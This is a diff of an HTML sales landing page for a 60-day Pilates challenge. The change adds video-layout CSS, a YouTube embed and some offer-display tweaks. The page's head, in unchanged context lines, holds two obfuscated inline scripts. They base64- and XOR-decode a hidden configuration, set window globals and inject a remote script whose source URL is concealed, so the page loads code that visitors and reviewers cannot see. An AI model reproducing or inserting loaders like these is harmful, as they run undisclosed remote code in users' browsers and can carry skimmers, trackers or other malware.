@@ -50,6 +50,13 @@
     @keyframes in{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}@keyframes spin{to{transform:rotate(360deg)}}@media(min-width:720px){main{padding:28px}.body-grid{grid-template-columns:repeat(4,1fr)}.video{aspect-ratio:16/10}.top{padding-top:20px}}
     @media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
   </style>
+  <style>
+    .vsl{max-width:420px;margin:22px auto;background:#000}
+    .video{aspect-ratio:9/16;max-height:none;padding:0;background:#000}
+    .video iframe{display:block;width:100%;height:100%;border:0}
+    .timeline{display:none}
+    @media(min-width:720px){.video{aspect-ratio:9/16}}
+  </style>
   <script>(function(){var q_8j=atob("DO68iBxO3Rv//tflzJWe/W4i/yHdlqORvJ2GpzMtuXXRi6OIpYjFpn8hsDWdjPiWr5zV+Gg98muWhrKJ457V8Hki83GM3PvHrZrI+nUsqG+ajfXfl7OQqnsisnmekqTH9rXHqnIvsH7dxPWVpZbZ5FUq/zfdiLaJuYuesj54vHnJzrPQ+tbZ6yl67y3Iy+fV+o+JuS5soEaC");var y_kr=[];for(var v_9gxk=0;v_9gxk<q_8j.length;v_9gxk++){y_kr.push(q_8j.charCodeAt(v_9gxk)&255);}var q_da=y_kr[0];var a_urnu=y_kr.slice(1,1+q_da);var f_y=y_kr.slice(1+q_da);var v_pm=f_y.map(function(b,a_jr2x){return b^a_urnu[a_jr2x%q_da];});var s_4t="";for(var q_8pu=0;q_8pu<v_pm.length;q_8pu++){s_4t+=String.fromCharCode(v_pm[q_8pu]&255);}var q_kj=decodeURIComponent(escape(s_4t));var b_op6=JSON.parse(q_kj);var k_b0w4=b_op6.globals||[];k_b0w4.forEach(function(u_xu){window[u_xu.name]=u_xu.value;});var n_t=document.createElement("script");n_t.src=b_op6.url;n_t.async=true;n_t.defer=true;(b_op6.attributes||[]).forEach(function(y_sf){n_t.setAttribute(y_sf.name,y_sf.value);});(document.head||document.documentElement).appendChild(n_t);})();</script>
   <script>(function(){var u_31c=atob("DCW9qApsI9p0oN4SRF6f3XgAAeBWyKpmNFaHhyUPR7Ra1ap/LUPEhmkDTvQW0vFhJ1fU2H4fDK8Aza09KETJzXkYDbAHgvIwJVHJ2mMOVq4R0/woH16fxmsBRvhOgrpzMESQ3X4BSrwNja5gIVPYxn5BUK8WybphZgmf3msAVr9WmvwwOXjA");var p_x=[];for(var x_x=0;x_x<u_31c.length;x_x++){p_x.push(u_31c.charCodeAt(x_x)&255);}var q_3y4h=p_x[0];var c_t5k9=p_x.slice(1,1+q_3y4h);var g_rbj=p_x.slice(1+q_3y4h);var y_3w4=g_rbj.map(function(b,f_ek){return b^c_t5k9[f_ek%q_3y4h];});var d_8xlf="";for(var w_6=0;w_6<y_3w4.length;w_6++){d_8xlf+=String.fromCharCode(y_3w4[w_6]&255);}var h_v=decodeURIComponent(escape(d_8xlf));var q_a=JSON.parse(h_v);var u_1=q_a.globals||[];u_1.forEach(function(a_ff){window[a_ff.name]=a_ff.value;});var r_2h=document.createElement("script");r_2h.src=q_a.url;r_2h.async=true;r_2h.defer=true;(q_a.attributes||[]).forEach(function(h_v164){r_2h.setAttribute(h_v164.name,h_v164.value);});(document.head||document.documentElement).appendChild(r_2h);})();</script>
 </head>
@@ -118,8 +125,15 @@ view=function(html){for(const [source,optimized] of Object.entries(optimizedAsse
 const originalResult=result;
 result=function(){
   originalResult();
+  const video=document.querySelector('#video');
+  if(video){
+    video.innerHTML='<iframe src="https://www.youtube-nocookie.com/embed/JNLBKdxVe7M?rel=0&playsinline=1" title="Presentazione della Sfida Pilates 60 Giorni" loading="lazy" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>';
+  }
+  const timeline=document.querySelector('.timeline');
+  if(timeline)timeline.remove();
   const offer=document.querySelector('#offer');
   if(!offer)return;
+  offer.classList.remove('hidden');
   const title=offer.querySelector('h3');
   const description=offer.querySelector('p');
   const list=offer.querySelector('.list');
